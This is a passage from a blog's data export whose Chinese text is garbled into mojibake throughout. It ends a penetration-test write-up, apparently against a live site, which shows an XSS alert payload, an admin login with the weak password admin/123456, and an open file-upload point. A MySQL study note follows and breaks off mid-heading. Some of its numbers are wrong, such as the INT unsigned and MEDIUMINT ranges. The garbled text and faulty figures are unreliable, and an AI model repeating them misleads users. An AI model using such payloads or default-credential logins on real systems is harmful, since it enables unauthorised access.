<å…¨ç§°è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­ã€‚>\n\nOWASP ZAPæ‰«æå‘ç°XSS\n![](https://i.loli.net/2019/07/12/5d282c01a0b6277693.png)\nè¾“å…¥`<script>alert(/Two groups the strongest/)</script>`\n![](https://i.loli.net/2019/07/12/5d282cce1443e90518.png)\næˆåŠŸå¼¹æ¡†\n![](https://i.loli.net/2019/07/12/5d2830149582680941.png)\n## é¢˜ç›®äºŒï¼šJSç½‘é¡µ\n## 0x01 åå°\nç™¾åº¦æœç´¢`JSPGOU`æ¡†æ¶å¾—åˆ°åå°åœ°å€\n![](/è®°ä¸€æ¬¡æ¸—é€æµ‹è¯•/20190712051248844.png)\nè®¿é—®åå°åœ°å€\n![](https://i.loli.net/2019/07/12/5d2842f2118f636894.png)\nå°è¯•å¼±å£ä»¤ç™»å½• è´¦å·ï¼šadmin å¯†ç ï¼š123456\n![](https://i.loli.net/2019/07/12/5d28432e5c5b811715.png)\nç™»å½•æˆåŠŸ\n![](https://i.loli.net/2019/07/12/5d2849295066170439.png)\n## 0x02 XSS\nè¾“å…¥`<script>alert(/Two groups the strongest/)</script>`\n![](https://i.loli.net/2019/07/12/5d284a782c7cb67767.png)\næˆåŠŸå¼¹çª—\n![](https://i.loli.net/2019/07/12/5d285022e47b090490.png)\n\n## 0x03 æ–‡ä»¶ä¸Šä¼ \nåœ¨åå°å‘ç°ä¸Šä¼ ç‚¹ï¼Œå¯ç›´æ¥ä¸Šä¼ æ–‡ä»¶\n![](https://i.loli.net/2019/07/12/5d2847fece78622568.png)\n\nå‚è€ƒï¼š\nhttp://www.dengtar.com/5148.html\nhttps://www.codercto.com/a/63186.html\n\n","tags":["æ¼æ´æŒ–æ˜"],"categories":["Web"]},{"title":"MySQL-å­¦ä¹ ç¬”è®°","url":"/posts/27695.html","content":"\n###   MySQLå®‰è£…\n\nWin mysqlå®‰è£…ï¼š[Windowsä¸‹å®‰è£…MySQLè¯¦ç»†æ•™ç¨‹ - m1racle - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/zhangkanghui/p/9613844.html)\n\nMac mysqlå®‰è£…ï¼š[åœ¨MACä¸Šå®‰è£…mysql_ç å†œä¼çš„åšå®¢-CSDNåšå®¢_macå®‰è£…mysql](https://blog.csdn.net/qq_41134710/article/details/116406099)\n\n### åº“æ“ä½œ\n\n#### æ•°æ®åº“è¿æ¥\n\n```bash\nmysql -h ä¸»æœºå -P ç«¯å£ -u ç”¨æˆ·å -p å¯†ç \n\nmysql -h 127.0.0.1 -P 3306 -u root -p root\n```\n\n#### åˆ›å»ºæ•°æ®åº“\n\n```sql\nCREATE DATABASE [IF NOT EXISTS] æ•°æ®åº“å CHARACTER SET æ•°æ®åº“é‡‡ç”¨çš„å­—ç¬¦é›† COLLATE å­—ç¬¦é›†çš„æ ¡å¯¹è§„åˆ™\n```\n\n- CHARACTER SET:æŒ‡å®šæ•°æ®åº“é‡‡ç”¨çš„å­—ç¬¦é›†ï¼Œå¦‚æœä¸æŒ‡å®šå­—ç¬¦é›†ï¼Œé»˜è®¤utf8\n\n- COLLATE:æŒ‡å®šæ•°æ®åº“å­—ç¬¦é›†çš„æ ¡å¯¹è§„åˆ™\n  - utf8_bin åŒºåˆ†å¤§å°å†™\n  - utf8_general_ci ä¸åŒºåˆ†å¤§å°å†™\n  - é»˜è®¤æ˜¯utf8_general_ci\n\n```sql\nCREATE DATABASE [IF NOT EXISTS] jwt CHARACTER SET utf8 COLLATE utf8_bin\n```\n\n#### åˆ é™¤æ•°æ®åº“\n\n```sql\nDROP DATABASE [IF EXISTS ] æ•°æ®åº“å\n```\n\n#### æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“\n\n```sql\nSHOW DATABASES\n```\n\n#### æŸ¥çœ‹æ•°æ®åº“çš„å®šä¹‰ä¿¡æ¯\n\n```sql\nSHOW CREATE DATABASE `æ•°æ®åº“å`\n\næ³¨ï¼šåˆ›å»ºæ•°æ®åº“ã€è¡¨çš„æ—¶å€™ï¼Œä¸ºäº†è§„é¿å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨åå¼•å·è§£å†³\n```\n\n#### å¤‡ä»½æ•°æ®åº“\n\n```bash\n#å¤‡ä»½æ•°æ®åº“\nmysqldump -u ç”¨æˆ·å -p -B æ•°æ®åº“1 æ•°æ®åº“2 æ•°æ®åº“n > è·¯å¾„/æ–‡ä»¶å.sql\n\n#å¤‡ä»½æ•°æ®åº“ä¸­è¡¨\nmysqldump -u ç”¨æˆ·å -p  æ•°æ®åº“ è¡¨1 è¡¨2 è¡¨n > è·¯å¾„/æ–‡ä»¶å.sql\n\næ³¨ï¼šè¯¥æŒ‡ä»¤è¦åœ¨DOSä¸‹æ‰§è¡Œ\n```\n\n#### æ¢å¤æ•°æ®åº“\n\n```sql\nSource è·¯å¾„/æ–‡ä»¶å.sql\n\næ³¨ï¼šè¯¥æŒ‡ä»¤è¦è¿›å…¥mysqlä¸‹æ‰§è¡Œ\n```\n\n### æ•°æ®ç±»å‹\n\n![](https://img.jwt1399.top/img/image-20211230202353079.png)\n\n#### æ•°å€¼å‹(æ•´æ•°)\n\n| ç±»å‹                | å­—èŠ‚ | æœ€å°å€¼               | æœ€å¤§å€¼               |\n| ------------------- | ---- | -------------------- | -------------------- |\n| TINYINT             | 1    | -128                 | 127                  |\n| TINYINT(unsigned)   | 1    | 0                    | 255                  |\n| SMALLINT            | 2    | -32768               | 32767                |\n| SMALLINT(unsigned)  | 2    | 0                    | 65535                |\n| MEDIUMINT           | 3    | -8388508             | 8388607              |\n| MEDIUMINT(unsigned) | 3    | 0                    | 16777215             |\n| INT                 | 4    | -2147483648          | 2147483647           |\n| INT(unsigned)       | 4    | 0                    | 16777215             |\n| BIGINT              | 8    | -9223372036854775808 | 9223372036854775807  |\n| BIGINT(unsigned)    | 8    | 0                    | 18446744073709551615 |\n\n```sql\nCREATE TABLE t1 (id TINYINT);#é»˜è®¤æ˜¯æœ‰ç¬¦å·çš„ï¼Œ-128~127\nCREATE TABLE t2 (id TINYINT UNSIGNED);#æŒ‡å®šunsinged,å°±æ˜¯æ— ç¬¦å·0~255\n```\n\n#### æ•°å€¼å‹(bit)\n\n![](https://img.jwt1399.top/img/202201061612447.png)\n\n#### æ•°å€¼å‹(å°æ•°)\n\n![](https://img.jwt1399.top/img/202201061612848.png)\n\n#### å­—ç¬¦ä¸²(char&varchar)\n\n- CHAR(size)\n  - å›ºå®šé•¿åº¦å­—ç¬¦ä¸²æœ€å¤§255 å­—ç¬¦\n- VARCHAR(size) 0~65535 å­—èŠ‚\n  - å¯å˜é•¿åº¦å­—ç¬¦ä¸²æœ€å¤§65532 å­—èŠ‚ã€æœ¬èº«è¿˜éœ€è¦1-3ä¸ªå­—èŠ‚ç”¨äºè®°å½•å­˜æ”¾å†…å®¹é•¿åº¦ã€‘\n  - å¦‚æœè¡¨çš„ç¼–ç æ˜¯utf8 ï¼Œsize = (65535-3) / 3 = 21844\n  - å¦‚æœè¡¨çš„ç¼–ç æ˜¯gbk ï¼Œ size = (65535-3) / 2 = 32766\n\n- æŸ¥è¯¢é€Ÿåº¦ CHAR > VARCHARï¼Œå› æ­¤æ•°æ®æ˜¯å®šé•¿æ—¶ï¼Œæ¨èä½¿ç”¨CHAR\n\nå¦‚æœ VARCHAR ä¸å¤Ÿç”¨ï¼Œå¯ä»¥ä½¿ç”¨mediumtextã€textã€longtext\n\n#### æ—¥æœŸç±»å‹\n\n```sql\nCREATE TABLE b_name (\n  birthday DATE , -- ç”Ÿæ—¥\n  job_time DATETIME, -- è®°å½•å¹´æœˆæ—¥æ—¶åˆ†ç§’\n  login_time TIMESTAMP\n  NOT NULL DEFAULT CURRENT_TIMESTAMP\n  ON UPDATE CURRENT_TIMESTAMP); -- ç™»å½•æ—¶é—´, å¦‚æœå¸Œæœ›login_timeåˆ—è‡ªåŠ¨æ›´æ–°, éœ€è¦é…ç½®\n\nSELECT * FROM b_name;\nINSERT INTO b_name(birthday, job_time)\nVALUES('2022-11-11','2022-11-11 10:10:10');\n-- å¦‚æœæˆ‘ä»¬æ›´æ–°b_nameè¡¨çš„æŸæ¡è®°å½•ï¼Œlogin_timeåˆ—ä¼šè‡ªåŠ¨çš„ä»¥å½“å‰æ—¶é—´è¿›è¡Œæ›´æ–°\n```\n\n### è¡¨æ“ä½œ\n\n#### åˆ›å»ºè¡¨\n\n```sql\nCREATE TABLE è¡¨å(\n\tfield1 datatype NOT NULL AUTO_INCREMENTï¼ŒPRIMARY KEY,\n\tfield2 datatype DEFAULT 'test',\n\tfield3 datatype,\n)character set å­—ç¬¦é›† collate æ ¡å¯¹è§„åˆ™ engine å¼•æ“\n\næ³¨ï¼š\nfield:æŒ‡å®šåˆ—åï¼Œdatatype: æŒ‡å®šåˆ—ç±»å‹(å­—æ®µç±»å‹)\ncharacter set :å¦‚ä¸æŒ‡å®šåˆ™ä¸ºæ‰€åœ¨æ•°æ®åº“å­—ç¬¦é›†\ncollate:å¦‚ä¸æŒ‡å®šåˆ™ä¸ºæ‰€åœ¨æ•°æ®åº“æ ¡å¯¹è§„åˆ™\nengine:å¼•æ“(è¿™ä¸ªæ¶‰åŠå†…å®¹è¾ƒå¤šï¼Œåé¢å•ç‹¬è®²è§£)\n```\n\n- å¦‚æœä½ ä¸æƒ³å­—æ®µä¸º **NULL** å¯ä»¥è®¾ç½®å­—æ®µçš„å±æ€§ä¸º **NOT NULL**ï¼Œ åœ¨æ“ä½œæ•°æ®åº“æ—¶å¦‚æœè¾“å…¥è¯¥å­—æ®µçš„æ•°æ®ä¸º**NULL** ï¼Œå°±ä¼šæŠ¥é”™ã€‚\n- **AUTO_INCREMENT**å®šä¹‰åˆ—ä¸ºè‡ªå¢çš„å±æ€§ï¼Œä¸€èˆ¬ç”¨äºä¸»é”®ï¼Œæ•°å€¼ä¼šè‡ªåŠ¨åŠ 1ã€‚\n- **PRIMARY KEY**å…³é”®å­—ç”¨äºå®šä¹‰åˆ—ä¸ºä¸»é”®ã€‚ æ‚¨å¯ä»¥ä½¿ç”¨å¤šåˆ—æ¥å®šä¹‰ä¸»é”®ï¼Œåˆ—é—´ä»¥é€—å·åˆ†éš”ã€‚\n- **DEFAULT**å…³é”®å­—ç”¨äºå®šä¹‰åˆ—çš„é»˜è®¤å€¼\n\n```sql\nCREATE TABLE `user`(\n  id INT,\n  name VARCHAR (255),\n  password VARCHAR (255),\n  birthday DATE\n)CHARACTER SET utf8 COLLATE utf8_bin ENGINE INNODB ;\n```\n\n#### æŸ¥çœ‹è¡¨ç»“æ„\n\n```sql\nDESC è¡¨å  -- æ˜¾ç¤ºè¡¨ç»“æ„ï¼Œå¯ä»¥æŸ¥çœ‹è¡¨çš„æ‰€æœ‰åˆ—\n```\n\n#### åˆ é™¤è¡¨\n\n```sql\nDROP TABLE [IF EXISTS] è¡¨å\n```\n\n####  æ·»åŠ åˆ—\n\n```sql\nALTER TABLE è¡¨å\nADD åˆ—å æ•°æ®ç±»å‹ [DEFAULT expr]\n\n-- åœ¨å‘˜å·¥è¡¨empä¸­å¢åŠ ä¸€ä¸ªimageåˆ—ï¼Œvarcharç±»å‹(è¦æ±‚åœ¨resumeåé¢)ï¼Œé»˜è®¤ä¸ä¸ºç©ºï¼Œé»˜è®¤æ•°æ®ä¸ºtestã€‚\nALTER TABLE emp\nADD image VARCHAR(32) NOT NULL DEFAULT 'test'\nAFTER RESUME\n\nDESC emp -- æ˜¾ç¤ºè¡¨ç»“æ„ï¼Œå¯ä»¥æŸ¥çœ‹è¡¨çš„æ‰€æœ‰åˆ—\n```\n\n#### ä¿®æ”¹åˆ—\n\n```sql\nALTER TABLE è¡¨å\nMODIFY åˆ—å æ•°æ®ç±»å‹ [DEFAULT expr]\n\n-- ä¿®æ”¹jobåˆ—ï¼Œä½¿å…¶é•¿åº¦ä¸º60ã€‚\nALTER TABLE emp\nMODIFY job VARCHAR(60) NOT NULL DEFAULT 'test'\n```\n\n#### åˆ é™¤åˆ—\n\n```sql\nALTER TABLE è¡¨å\nDROP åˆ—å \n\n-- åˆ é™¤sexåˆ—ã€‚\nALTER TABLE emp\nDROP sex\n```\n\n#### ä¿®æ”¹è¡¨å\n\n```sql\nRENAME TABLE è¡¨å TO æ–°è¡¨å\n\n-- ä¿®æ”¹è¡¨åæ”¹ä¸ºemployeeã€‚\nRENAME TABLE emp TO employee\n```\n\n#### ä¿®æ”¹è¡¨å­—ç¬¦é›†\n\n```sql\nALTER TABLE è¡¨å CHARACTER SET utf8\n\n-- ä¿®æ”¹è¡¨çš„å­—ç¬¦é›†ä¸ºutf8\nALTER TABLE employee CHARACTER SET utf8\n```\n\n#### ä¿®æ”¹åˆ—å\n\n```sql\nALTER TABLE è¡¨å\nCHANGE åˆ—å æ–°åˆ—å æ•°æ®ç±»å‹ [DEFAULT expr]\n\n-- åˆ—åname ä¿®æ”¹ä¸ºuser_name\nALTER TABLE employee\nCHANGE `name` `user_name` VARCHAR(64) NOT NULL DEFAULT 'test'\n```\n\n### CRUDè¯­å¥\n\n> `CRUD`å³å¢åŠ (Create)ã€æŸ¥è¯¢(Retrieve)ã€æ›´æ–°(Update)ã€åˆ é™¤(Delete)å››ä¸ªå•è¯çš„é¦–å­—æ¯ç¼©å†™ã€‚\n\n#### å¢åŠ (Create)\n\n```sql\n-- æ™®é€šæ’å…¥\nINSERT INTO è¡¨å VALUE (value1,value2)\n\n-- æŒ‡å®šè¦æ’å…¥æ•°æ®çš„åˆ—\nINSERT INTO è¡¨å (column1,column2) VALUE (value1,value2) \n\n-- æ‰¹é‡æ’å…¥ï¼ˆåº”æ³¨æ„SQLçš„é•¿åº¦é™åˆ¶ï¼‰\nINSERT INTO TABLE VALUES (value1,value2),(value1,value2)\n\n-- æŠŠä¸€ä¸ªè¡¨çš„æ•°æ®æ’å…¥åˆ°å¦ä¸€ä¸ªè¡¨ä¸­(æ’å…¥å…¨éƒ¨æ•°æ®)\nINSERT INTO ç›®æ ‡è¡¨ SELECT * FROM æ¥æºè¡¨  [WHERE key=value]\n\n-- æŠŠä¸€ä¸ªè¡¨çš„æ•°æ®æ’å…¥åˆ°å¦ä¸€ä¸ªè¡¨ä¸­(æŒ‡å®šå­—æ®µ)\nINSERT  INTO ç›®æ ‡è¡¨ (å­—æ®µ1, å­—æ®µ2, ...) SELECT å­—æ®µ1, å­—æ®µ2,... FROM æ¥æºè¡¨  [WHERE key=value]\n```\n\n#### æŸ¥è¯¢(Retrieve)\n\n```sql\nSELECT column1,column2 FROM è¡¨å\n\n-- æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰å­¦ç”Ÿçš„ä¿¡æ¯ã€‚\nSELECT * FROM student;\n-- æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰å­¦ç”Ÿçš„å§“åå’Œå¯¹åº”çš„è‹±è¯­æˆç»©ã€‚\nSELECT `name`,english FROM student;\n-- è¿‡æ»¤è¡¨ä¸­é‡å¤æ•°æ®ã€‚\nSELECT DISTINCT english FROM student;\n-- ä½¿ç”¨è¡¨è¾¾å¼å¯¹æŸ¥è¯¢åˆ—è¿ç®—\nSELECT `name`, (chinese+english+math) FROM student;\n-- åœ¨æ‰€æœ‰å­¦ç”Ÿæ€»åˆ†åŠ 10 åˆ†çš„æƒ…å†µ\nSELECT `name`, (chinese + english + math + 10) FROM student;\n-- ä½¿ç”¨åˆ«åè¡¨ç¤ºå­¦ç”Ÿåˆ†æ•°ã€‚\nSELECT `name` , (chinese + english + math + 10) AS total_score FROM student;\n```\n\n#### æ›´æ–°(Update)\n\n```sql\n-- ä¸€æ¬¡æ›´æ–°ä¸€ä¸ªå­—æ®µ\nUPDATE table SET column1 = value1 WHERE æ¡ä»¶ -- å¦‚æœä¸åŠ WHEREæ¡ä»¶ï¼ŒUPDATEè¯­å¥ä¼šé»˜è®¤æ›´æ–°æ‰€æœ‰è¡¨ï¼Œæ…ç”¨ã€‚\n\n-- ä¸€æ¬¡æ›´æ–°å¤šä¸ªå­—æ®µ\nUPDATE table SET column1 = value1,column2 = value2 WHERE æ¡ä»¶\n\n\n-- å°†æ‰€æœ‰å‘˜å·¥è–ªæ°´ä¿®æ”¹ä¸º5000 å…ƒã€‚\nUPDATE employee SET salary = 5000\n-- å°†å§“åä¸ºå°å¦–æ€ªçš„å‘˜å·¥è–ªæ°´ä¿®æ”¹ä¸º3000 å…ƒã€‚\nUPDATE employee SET salary = 3000 WHERE user_name = 'å°å¦–æ€ª'\n-- å°†è€å¦–æ€ªçš„è–ªæ°´åœ¨åŸæœ‰åŸºç¡€ä¸Šå¢åŠ 1000 å…ƒ\nUPDATE employee SET salary = salary + 1000 WHERE user_name = 'è€å¦–æ€ª'\n-- å¯ä»¥ä¿®æ”¹å¤šä¸ªåˆ—çš„å€¼\nUPDATE employee SET salary = salary + 1000 , job = 'ç å†œ' WHERE user_name = 'è€å¦–æ€ª'\nSELECT * FROM employee;\n```\n\n#### åˆ é™¤(Delete)\n\n```sql\nDELETE FROM è¡¨å WHERE column1 = value1\n\n-- åˆ é™¤è¡¨ä¸­åç§°ä¸ºâ€™è€å¦–æ€ªâ€™çš„è®°å½•ã€‚\nDELETE FROM employee WHERE user_name = 'è€å¦–æ€ª';\n-- åˆ é™¤è¡¨ä¸­æ‰€æœ‰è®°å½•, æ…ç”¨ã€‚\nDELETE FROM employee;\n```\n\n### äº‹åŠ¡\n\näº‹åŠ¡ç”¨äºä¿è¯æ•°æ®çš„ä¸€è‡´æ€§å®ƒç”±ä¸€ç»„ç›¸å…³çš„ dml è¯­å¥ç»„æˆï¼Œè¯¥ç»„çš„ dml è¯­å¥è¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ã€‚å¦‚:è½¬è´¦å°±è¦ç”¨äº‹åŠ¡æ¥å¤„ç†ï¼Œç”¨ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚\n\nå½“æ‰§è¡Œäº‹åŠ¡æ“ä½œæ—¶(dmlè¯­å¥)ï¼Œmysqlä¼šåœ¨è¡¨ä¸ŠåŠ é”ï¼Œé˜²æ­¢å…¶å®ƒç”¨æˆ·æ”¹è¡¨çš„æ•°æ®\n\n#### äº‹åŠ¡çš„å‡ ä¸ªé‡è¦æ“ä½œ\n\n1. **start transaction** --å¼€å§‹ä¸€ä¸ªäº‹åŠ¡\n2. **savepoint ä¿å­˜ç‚¹å** --è®¾ç½®ä¿å­˜ç‚¹\n3. **rollback to ä¿å­˜ç‚¹å** --å›é€€äº‹åŠ¡\n4. **rollback** --å›é€€å…¨éƒ¨äº‹åŠ¡\n5. **commit** --æäº¤äº‹åŠ¡ï¼Œæ‰€æœ‰çš„æ“ä½œç”Ÿæ•ˆï¼Œä¸èƒ½å›é€€\n\n```sql\n-- 1. åˆ›å»ºä¸€å¼ æµ‹è¯•è¡¨\nCREATE TABLE test\n( id INT,\n`name` VARCHAR(32));\n\n-- 2. å¼€å§‹äº‹åŠ¡\nSTART TRANSACTION\n\n-- 3. è®¾ç½®ä¿å­˜ç‚¹\nSAVEPOINT a\n-- æ‰§è¡Œdml æ“ä½œ\nINSERT INTO test VALUES(100, 'tom');\n\nSELECT * FROM test;\n\nSAVEPOINT b\n-- æ‰§è¡Œdml æ“ä½œ\nINSERT INTO test VALUES(200, 'jack');\n\n-- å›é€€åˆ°b\nROLLBACK TO b\n\n-- ç»§ç»­å›é€€a\nROLLBACK TO a\n\n-- å¦‚æœè¿™æ ·, è¡¨ç¤ºç›´æ¥å›é€€åˆ°äº‹åŠ¡å¼€å§‹çš„çŠ¶æ€.\nROLLBACK\n\n-- æäº¤äº‹åŠ¡\nCOMMIT\n```\n\n- ä¿å­˜ç‚¹(savepoint)ï¼šä¿å­˜ç‚¹æ˜¯äº‹åŠ¡ä¸­çš„ç‚¹ï¼Œç”¨äºå–æ¶ˆéƒ¨åˆ†äº‹åŠ¡ï¼Œ\n\n- å½“æ‰§è¡Œå›é€€äº‹åŠ¡(rollback)æ—¶ï¼Œé€šè¿‡æŒ‡å®šä¿å­˜ç‚¹å¯ä»¥å›é€€åˆ°æŒ‡å®šçš„ç‚¹\n- å½“æäº¤äº‹åŠ¡(commit)æ—¶ ,ä¼šè‡ªåŠ¨çš„åˆ é™¤è¯¥äº‹åŠ¡æ‰€å®šä¹‰çš„æ‰€æœ‰ä¿å­˜ç‚¹ï¼Œå½“æ‰§è¡Œäº† commit è¯­å¥åï¼Œä¼šç¡®è®¤äº‹åŠ¡çš„å˜åŒ–ã€ç»“æŸäº‹åŠ¡ã€åˆ é™¤ä¿å­˜ç‚¹ã€é‡Šæ”¾é”ï¼Œæ•°æ®ç”Ÿæ•ˆã€‚\n\n#### äº‹åŠ¡ç»†èŠ‚è®¨è®º\n\n- 1.å¦‚æœä¸å¼€å§‹äº‹åŠ¡ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œdml æ“ä½œæ˜¯è‡ªåŠ¨æäº¤çš„ï¼Œä¸èƒ½å›æ»š\n- 2.å¦‚æœå¼€å§‹ä¸€ä¸ªäº‹åŠ¡ï¼Œä½ æ²¡æœ‰åˆ›å»ºä¿å­˜ç‚¹ï¼Œä½ å¯ä»¥æ‰§è¡Œ rollbackï¼Œé»˜è®¤å°±æ˜¯å›é€€åˆ°ä½ äº‹åŠ¡å¼€å§‹çš„çŠ¶æ€\n- 3.ä½ ä¹Ÿå¯ä»¥åœ¨è¿™ä¸ªäº‹åŠ¡ä¸­(è¿˜æ²¡æœ‰æäº¤æ—¶)ï¼Œåˆ›å»ºå¤šä¸ªä¿å­˜ç‚¹.æ¯”å¦‚: savepoint aaa; æ‰§è¡Œdmlï¼Œsavepoint bbb;\n- 4.ä½ å¯ä»¥åœ¨äº‹åŠ¡æ²¡æœ‰æäº¤å‰ï¼Œé€‰æ‹©å›é€€åˆ°å“ªä¸ªä¿å­˜ç‚¹\n- 5, mysqlçš„äº‹åŠ¡æœºåˆ¶éœ€è¦ innodb çš„å­˜å‚¨å¼•æ“æ‰å¯ä»¥ä½¿ç”¨ï¼Œmyisamä¸å¥½ä½¿.\n- 6.å¼€å§‹ä¸€ä¸ªäº‹åŠ¡ start transaction æˆ–è€… set autocommit=off;\n\n#### äº‹åŠ¡éš”ç¦»çº§åˆ«\n\n1.å¤šä¸ªè¿æ¥å¼€å¯å„è‡ªäº‹åŠ¡æ“ä½œæ•°æ®åº“ä¸­æ•°æ®æ—¶ï¼Œæ•°æ®åº“ç³»ç»Ÿè¦è´Ÿè´£éš”ç¦»æ“ä½œï¼Œä»¥ä¿è¯å„ä¸ªè¿æ¥åœ¨è·å–æ•°æ®æ—¶çš„å‡†ç¡®æ€§ã€‚\n2.å¦‚æœä¸è€ƒè™‘éš”ç¦»æ€§ï¼Œå¯èƒ½ä¼šå¼•å‘å¦‚ä¸‹é—®é¢˜:\n\n- è„è¯»(dirty read)\n  - å½“ä¸€ä¸ªäº‹åŠ¡è¯»å–å¦ä¸€ä¸ªäº‹åŠ¡å°šæœªæäº¤çš„æ”¹å˜(update,insert,delete)æ—¶ï¼Œäº§ç”Ÿè„è¯»\n- ä¸å¯é‡å¤è¯»(nonrepeatable read)\n  - åŒä¸€æŸ¥è¯¢åœ¨åŒäº‹åŠ¡ä¸­å¤šæ¬¡è¿›è¡Œï¼Œç”±äºå…¶ä»–æäº¤äº‹åŠ¡æ‰€åšçš„ä¿®æ”¹æˆ–åˆ é™¤ï¼Œ æ¯æ¬¡è¿”å›ä¸åŒçš„ç»“æœé›†ï¼Œæ­¤æ—¶å‘ç”Ÿä¸å¯é‡å¤è¯»ã€‚\n- å¹»è¯»(phantom read)\n  - åŒä¸€æŸ¥è¯¢åœ¨åŒä¸€äº‹åŠ¡ä¸­å¤šæ¬¡è¿›è¡Œï¼Œç”±äºå…¶ä»–æäº¤äº‹åŠ¡æ‰€åšçš„æ’å…¥æ“ä½œï¼Œ æ¯æ¬¡è¿”å›ä¸åŒçš„ç»“æœé›†ï¼Œæ­¤æ—¶å‘ç”Ÿå¹»è¯»ã€‚\n\n\n![](https://img.jwt1399.top/img/image-20220223201056641.png)\n\n```sql\n1. æŸ¥çœ‹å½“å‰ä¼šè¯éš”ç¦»çº§åˆ«\nselect @@tx_isolation;\n2.æŸ¥çœ‹ç³»ç»Ÿå½“å‰éš”ç¦»çº§åˆ«\nselect @@global.tx_isolation;\n3. è®¾ç½®å½“å‰ä¼šè¯éš”ç¦»çº§åˆ«\nset session transaction isolation level repeatable read;\n4.è®¾ç½®ç³»ç»Ÿå½“å‰éš”ç¦»çº§åˆ«\nset global transaction isolation level repeatable read;\n5.mysqlé»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«æ˜¯repeatable read ,ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ç‰¹æ®Š\nè¦æ±‚ï¼Œæ²¡æœ‰å¿…è¦ä¿®æ”¹(å› ä¸ºè¯¥çº§åˆ«å¯ä»¥æ»¡è¶³ç»å¤§éƒ¨åˆ†é¡¹ç›®éœ€æ±‚)\n```\n\nâ—å…¨å±€ä¿®æ”¹ï¼Œä¿®æ”¹my.inié…ç½®æ–‡ä»¶ï¼Œåœ¨æœ€ååŠ ä¸Š\n#å¯é€‰å‚æ•°æœ‰: READ-UNCOMMITTED, READ-COMMITTED, REPEATABLE-READ, SERIALIZABLE.\n[mysqld]\ntransaction-isolation = REPEATABLE-READ\n\n#### äº‹åŠ¡çš„ACID\n\n- 1.åŸå­æ€§(Atomicity)\n  - åŸå­æ€§æ˜¯æŒ‡äº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¸­çš„æ“ä½œè¦ä¹ˆéƒ½å‘ç”Ÿï¼Œè¦ä¹ˆéƒ½ä¸å‘ç”Ÿã€‚\n- 2.ä¸€è‡´æ€§(Consistency)\n  - äº‹åŠ¡å¿…é¡»ä½¿æ•°æ®åº“ä»ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€å˜æ¢åˆ°å¦å¤–ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€\n- 3.éš”ç¦»æ€§(Isolation)\n  - äº‹åŠ¡çš„éš”ç¦»æ€§æ˜¯å¤šä¸ªç”¨æˆ·å¹¶å‘è®¿é—®æ•°æ®åº“æ—¶ï¼Œæ•°æ®åº“ä¸ºæ¯ä¸€ä¸ªç”¨æˆ·å¼€å¯çš„äº‹åŠ¡ï¼Œä¸èƒ½è¢«å…¶ä»–äº‹åŠ¡çš„æ“ä½œæ•°æ®æ‰€å¹²æ‰°ï¼Œå¤šä¸ªå¹¶å‘äº‹åŠ¡ä¹‹é—´è¦ç›¸äº’éš”ç¦»ã€‚\n- 4.æŒä¹…æ€§(Durability)\n  - æŒä¹…æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡ä¸€æ—¦è¢«æäº¤ï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ¥ä¸‹æ¥å³ä½¿æ•°æ®åº“å‘ç”Ÿæ•…éšœä¹Ÿä¸åº”è¯¥å¯¹å…¶æœ‰ä»»ä½•å½±å“\n\n### æ—¥æœŸå‡½æ•°\n\n#### DAYOFWEEK(date)\n\nè¿”å›æ—¥æœŸdateçš„æ˜ŸæœŸç´¢å¼•(1=æ˜ŸæœŸå¤©ï¼Œ2=æ˜ŸæœŸä¸€, â€¦â€¦7=æ˜ŸæœŸå…­)ã€‚è¿™äº›ç´¢å¼•å€¼å¯¹åº”äºODBCæ ‡å‡†ã€‚\n\n```sql\nselect DAYOFWEEK('1998-02-03')\n-> 3\n```\n\n#### WEEKDAY(date)\n\nè¿”å›dateçš„æ˜ŸæœŸç´¢å¼•(0=æ˜ŸæœŸä¸€ï¼Œ1=æ˜ŸæœŸäºŒ, â€¦â€¦6= æ˜ŸæœŸå¤©)ã€‚\n\n```sql\nmysql> select WEEKDAY('1997-10-04 22:23:00');\n-> 5\n```\n\n#### DAYOFMONTH(date)\n\nè¿”å›dateçš„æœˆä»½ä¸­æ—¥æœŸï¼Œåœ¨1åˆ°31èŒƒå›´å†…ã€‚\n\n```sql\nmysql> select DAYOFMONTH('1998-02-03');\n-> 3\n```\n\n#### DAYOFYEAR(date)\n\nè¿”å›dateåœ¨ä¸€å¹´ä¸­çš„æ—¥æ•°, åœ¨1åˆ°366èŒƒå›´å†…ã€‚\n\n```sql\nmysql> select DAYOFYEAR('1998-02-03');\n-> 34\n```\n\n#### DAYNAME(date)\n\nè¿”å›dateçš„æ˜ŸæœŸåå­—ã€‚\n\n```sql\nmysql> select DAYNAME(\"1998-02-05\");\n-> 'Thursday'\n```\n\n#### MONTHNAME(date)\n\nè¿”å›dateçš„æœˆä»½åå­—ã€‚\n\n```sql\nmysql> select MONTHNAME(\"1998-02-05\");\n-> 'February'\n```\n\n#### QUARTER(date)\n\nè¿”å›dateä¸€å¹´ä¸­çš„å­£åº¦ï¼ŒèŒƒå›´1åˆ°4ã€‚\n\n```sql\nmysql> select QUARTER('98-04-01');\n-> 2\n```\n\n#### 